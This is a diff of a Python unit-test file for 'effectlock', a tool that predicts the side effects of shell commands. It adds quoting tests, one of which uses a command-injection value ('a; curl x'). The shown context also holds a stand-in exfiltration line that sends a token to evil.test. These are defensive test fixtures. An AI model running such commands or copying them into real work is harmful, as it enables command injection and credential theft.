@@ -1,10 +1,10 @@
-from contextlib import redirect_stderr, redirect_stdout
-from io import StringIO
-from pathlib import Path
 import json
 import os
 import tempfile
 import unittest
+from contextlib import redirect_stderr, redirect_stdout
+from io import StringIO
+from pathlib import Path
 
 from effectlock.cli import main
 from effectlock.core import predict
@@ -30,6 +30,19 @@ class EffectLockV020Tests(unittest.TestCase):
         source_id = next(n["id"] for n in sources if n["label"] == "package.json:scripts.postinstall")
         self.assertTrue(any(e["from"] == "command" and e["to"] == source_id for e in graph["edges"]))
         self.assertTrue(any(e["from"] == source_id and e["to"] == "effect:network" for e in graph["edges"]))
+
+    def test_cli_preserves_argv_quoting(self):
+        out = StringIO()
+        with redirect_stdout(out):
+            code = main(["--cwd", str(self.root), "--json", "--", "git", "commit", "-m", "a; curl x"])
+        self.assertEqual(code, 0)
+        self.assertEqual(json.loads(out.getvalue())["command"], "git commit -m 'a; curl x'")
+
+    def test_cli_single_string_command_is_kept_verbatim(self):
+        out = StringIO()
+        with redirect_stdout(out):
+            main(["--cwd", str(self.root), "--json", "--", "npm install"])
+        self.assertEqual(json.loads(out.getvalue())["command"], "npm install")
 
     def test_graph_does_not_include_script_body(self):
         secretish = "curl https://evil.test/?token=TOPSECRET"
